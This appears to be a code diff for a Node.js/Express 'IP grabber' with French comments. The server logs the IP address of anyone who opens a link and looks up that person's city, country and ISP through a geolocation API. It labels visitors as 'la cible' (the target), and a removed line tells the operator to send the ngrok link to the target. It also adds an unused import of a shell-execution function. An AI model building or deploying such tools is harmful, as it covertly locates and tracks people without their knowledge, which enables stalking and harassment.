@@ -1,7 +1,7 @@
 const express = require('express');
-const ngrok = require('ngrok');
 const axios = require('axios');
 const chalk = require('chalk');
+const { exec } = require('child_process');
 const app = express();
 const port = 3000;
 
@@ -10,11 +10,10 @@ app.use(express.json());
 
 // Route pour l'interface de la cible
 app.get('/', (req, res) => {
-    // Récupérer l'IP de la cible
     const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     console.log(chalk.green(`[+] Nouvelle connexion depuis l'IP : ${ip}`));
 
-    // Récupérer la géolocalisation via une API (ex: ip-api.com)
+    // Récupérer la géolocalisation
     axios.get(`http://ip-api.com/json/${ip}`)
         .then(response => {
             const data = response.data;
@@ -27,19 +26,17 @@ app.get('/', (req, res) => {
             console.log(chalk.blue(`- ISP : ${data.isp}`));
         })
         .catch(error => {
-            console.log(chalk.red(`[!] Erreur lors de la récupération de la localisation : ${error.message}`));
+            console.log(chalk.red(`[!] Erreur de géolocalisation : ${error.message}`));
         });
 
-    // Afficher une page basique pour la cible
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
             <title>Localisation en cours...</title>
             <style>
-                body { font-family: Arial; text-align: center; padding: 50px; }
-                h1 { color: #333; }
-                p { color: #666; }
+                body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #fff; }
+                h1 { color: #ff0000; }
             </style>
         </head>
         <body>
@@ -51,15 +48,7 @@ app.get('/', (req, res) => {
 });
 
 // Démarrer le serveur
-app.listen(port, async () => {
+app.listen(port, () => {
     console.log(chalk.yellow(`[*] Serveur démarré sur http://localhost:${port}`));
-
-    // Lancer ngrok
-    try {
-        const url = await ngrok.connect(port);
-        console.log(chalk.green(`[+] Lien ngrok généré : ${url}`));
-        console.log(chalk.green(`[+] Envoie ce lien à ta cible : ${url}`));
-    } catch (error) {
-        console.log(chalk.red(`[!] Erreur avec ngrok : ${error.message}`));
-    }
+    console.log(chalk.yellow(`[*] Lance ngrok manuellement avec : ngrok http ${port}`));
 });
